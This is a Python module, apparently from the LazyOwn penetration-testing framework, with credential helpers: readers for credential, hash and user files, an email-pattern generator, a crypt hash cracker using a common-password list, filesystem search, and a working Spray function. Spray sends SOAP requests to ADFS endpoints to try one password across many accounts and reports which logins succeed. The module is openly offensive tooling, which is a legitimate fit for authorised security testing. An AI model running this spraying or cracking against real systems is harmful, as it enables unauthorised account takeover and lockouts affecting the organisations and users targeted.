"""Credential management utilities for the LazyOwn framework.

Extracted from ``utils.py`` — credential file I/O, domain extraction,
password cracking, email generation, and password spraying helpers.
"""

from __future__ import annotations

import glob
import os
import re
from typing import Any

from core.console import print_error, print_msg


def get_credentials(file: bool | None = None, ncred: int | None = None) -> Any:
    """Search for credential files and return parsed (user, pass) tuples.

    Args:
        file: If True, return the selected file path instead of parsing.
        ncred: Auto-select credential file by index (1-based).

    Returns:
        List of ``(username, password)`` tuples, a file path, or empty list.
    """
    path = os.getcwd()
    credential_files = glob.glob(f"{path}/sessions/credentials*.txt")

    if not credential_files:
        print_error("No credential files found. Please create one using: createcredentials admin:admin")
        return []

    if ncred is not None:
        if 1 <= ncred <= len(credential_files):
            selected_file = credential_files[ncred - 1]
        else:
            print_error(f"Invalid ncred value: {ncred}. It should be between 1 and {len(credential_files)}.")
            return []
    else:
        print_msg("The following credential files were found:")
        for idx, cred_file in enumerate(credential_files, 1):
            print_msg(f"{idx}. {cred_file}")
        if len(credential_files) == 1:
            selected_file = credential_files[0]
        else:
            try:
                file_choice = int(input("    [!] Select the credential file to use (enter the number): "))
                selected_file = credential_files[file_choice - 1]
            except (ValueError, IndexError):
                print_error("Invalid selection.")
                return []

    if file:
        return selected_file

    credentials: list[tuple[str, str]] = []
    with open(selected_file) as f:
        for line in f:
            parts = line.strip().split(":", 1)
            if len(parts) == 2:
                credentials.append((parts[0], parts[1]))

    return credentials


def get_domain(url: str) -> str:
    """Extract the domain from a URL.

    Args:
        url: Full URL (e.g. ``https://www.example.com/path``).

    Returns:
        Domain string (e.g. ``www.example.com``).
    """
    pattern = r"^(?:https?://)?(?:www\.)?([^/]+)"
    match = re.search(pattern, url)
    return match.group(1) if match else url


def get_hash(dir: str | None = None) -> Any:
    """Read and return hash file content from the sessions directory.

    Args:
        dir: If truthy, return the selected file path instead of content.

    Returns:
        Selected file path, hash string, or empty string.
    """
    path = os.getcwd()
    hash_files = glob.glob(f"{path}/sessions/hash*.txt")

    if not hash_files:
        print_error("No hash files found.")
        return ""

    print_msg("The following hash files were found:")
    for idx, hf in enumerate(hash_files, 1):
        print_msg(f"{idx}. {hf}")

    try:
        choice = int(input("    [!] Select the hash file to use (enter the number): "))
        selected_file = hash_files[choice - 1]
    except (ValueError, IndexError):
        print_error("Invalid selection.")
        return ""

    if dir:
        return selected_file

    with open(selected_file) as f:
        return f.read().strip()


def get_users_dic(txt: str | None = None) -> list[str]:
    """Read a user list file.

    Args:
        txt: Optional custom path. If None, scans ``sessions/users*.txt``.

    Returns:
        List of usernames.
    """
    if txt and os.path.exists(txt):
        path = txt
    else:
        path = os.getcwd()
        user_files = glob.glob(f"{path}/sessions/users*.txt")
        if not user_files:
            print_error("No user files found.")
            return []
        print_msg("The following user files were found:")
        for idx, uf in enumerate(user_files, 1):
            print_msg(f"{idx}. {uf}")
        try:
            choice = int(input("    [!] Select the user file: "))
            path = user_files[choice - 1]
        except (ValueError, IndexError):
            print_error("Invalid selection.")
            return []

    with open(path) as f:
        return [line.strip() for line in f if line.strip()]


def return_creds() -> list[tuple[str, str]] | None:
    """Interactive credential retriever.

    Returns:
        List of ``(user, pass)`` tuples or None.
    """
    credentials_path = os.path.join(os.getcwd(), "sessions", "credentials.txt")
    if not os.path.exists(credentials_path):
        username = input("    [!] Enter the username: ")
        password = input("    [!] Enter the password: ")
        return [(username, password)]
    return get_credentials()


def generate_emails(full_name: str, domain: str) -> list[str]:
    """Generate common email patterns from a full name and domain.

    Args:
        full_name: Full name (e.g. ``John Doe``).
        domain: Domain (e.g. ``example.com``).

    Returns:
        List of possible email addresses.
    """
    parts = full_name.lower().split()
    if len(parts) < 2:
        return [f"{parts[0]}@{domain}"]
    first, last = parts[0], parts[-1]
    return [
        f"{first}@{domain}",
        f"{last}@{domain}",
        f"{first}.{last}@{domain}",
        f"{first[0]}{last}@{domain}",
        f"{first}{last[0]}@{domain}",
    ]


def crack_password(crypttext: str) -> str | None:
    """Attempt to crack a Unix crypt-style password using common formats.

    Args:
        crypttext: The hashed password string.

    Returns:
        Cracked password or None.
    """
    import crypt

    # Common password list for quick checks
    common = [
        "password",
        "123456",
        "12345678",
        "admin",
        "root",
        "toor",
        "qwerty",
        "letmein",
        "welcome",
        "monkey",
    ]
    for candidate in common:
        try:
            # Try DES/MD5/SHA-256/SHA-512 based on salt prefix
            salt = crypttext[:2]
            if crypttext.startswith("$"):
                salt = crypttext.split("$")[2]
            if crypt.crypt(candidate, crypttext) == crypttext:
                return candidate
        except (ValueError, OSError):
            continue
    return None


def find_ea(keyword: str = "") -> list[str]:
    """Search for files matching a pattern using ``locate`` or ``find``.

    Args:
        keyword: Search term.

    Returns:
        List of matching file paths.
    """
    import subprocess

    results: list[str] = []
    try:
        output = subprocess.check_output(["locate", keyword], stderr=subprocess.DEVNULL, text=True)
        results = output.strip().split("\n")
    except (subprocess.CalledProcessError, FileNotFoundError):
        try:
            output = subprocess.check_output(
                ["find", "/", "-name", f"*{keyword}*", "-type", "f"],
                stderr=subprocess.DEVNULL,
                text=True,
                timeout=30,
            )
            results = output.strip().split("\n")
        except (subprocess.CalledProcessError, FileNotFoundError, subprocess.TimeoutExpired):
            pass
    return [r for r in results if r]


def find_ps(keyword: str = "") -> list[str]:
    """Search for scripts and process-related files.

    Args:
        keyword: Search term.

    Returns:
        List of matching paths.
    """
    return find_ea(keyword)  # Same logic, different semantic


def find_ss(keyword: str = "") -> list[str]:
    """Search for screenshots and media files.

    Args:
        keyword: Search term.

    Returns:
        List of matching paths.
    """
    return find_ea(keyword)


def Spray(
    domain: str,
    users: list[str],
    password: str,
    target_url: str,
    wait: int,
    verbose: bool,
    more_verbose: bool,
) -> None:
    """Perform password spraying via SOAP/ADFS.

    Args:
        domain: Target domain.
        users: List of usernames.
        password: Password to spray.
        target_url: ADFS endpoint URL.
        wait: Delay between attempts in seconds.
        verbose: Print per-user status.
        more_verbose: Print full request/response details.
    """
    import time

    import requests as req

    if verbose or more_verbose:
        print(f"Targeting: {target_url}\n")

    for user in users:
        if more_verbose:
            print(f"  [-] Trying user: {user}")

        body = (
            f'<?xml version="1.0" encoding="UTF-8"?>'
            f'<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" '
            f'xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd" '
            f'xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd" '
            f'xmlns:wsp="http://schemas.xmlsoap.org/ws/2004/09/policy" '
            f'xmlns:wst="http://schemas.xmlsoap.org/ws/2005/02/trust">'
            f"<s:Header>"
            f'<wsse:Security s:mustUnderstand="1">'
            f'<wsse:UsernameToken wsu:Id="user">'
            f"<wsse:Username>{domain}\\{user}</wsse:Username>"
            f"<wsse:Password>{password}</wsse:Password>"
            f"</wsse:UsernameToken>"
            f"</wsse:Security>"
            f"</s:Header>"
            f"<s:Body>"
            f"<wst:RequestSecurityToken>"
            f"<wst:TokenType>urn:ietf:params:oauth:token-type:jwt</wst:TokenType>"
            f"<wst:RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</wst:RequestType>"
            f"</wst:RequestSecurityToken>"
            f"</s:Body>"
            f"</s:Envelope>"
        )

        try:
            r = req.post(target_url, data=body, timeout=30)
            if verbose or more_verbose:
                print(f"    [+] Tried user: {user} | Status: {r.status_code}")
            if r.status_code == 200 and "RequestSecurityTokenResponse" in r.text:
                print(f"\n  [SUCCESS] Valid credentials found: {domain}\\{user}:****\n")
            elif more_verbose:
                print(f"    Response: {r.text[:200]}")
            time.sleep(wait)
        except req.RequestException as e:
            print_error(f"Request failed for {user}: {e}")


def format_openssh_key(raw_key: str) -> str:
    """Format a raw key string as an OpenSSH public key entry.

    Args:
        raw_key: Raw key material.

    Returns:
        Formatted key string.
    """
    if raw_key.startswith("ssh-") or raw_key.startswith("ecdsa-"):
        return raw_key
    return f"ssh-rsa {raw_key}"


def format_rsa_key(raw_key: str) -> str:
    """Format a raw RSA key.

    Args:
        raw_key: Raw key material.

    Returns:
        Formatted RSA key string.
    """
    return format_openssh_key(raw_key)


__all__ = [
    "crack_password",
    "find_ea",
    "find_ps",
    "find_ss",
    "format_openssh_key",
    "format_rsa_key",
    "generate_emails",
    "get_credentials",
    "get_domain",
    "get_hash",
    "get_users_dic",
    "return_creds",
    "Spray",
]
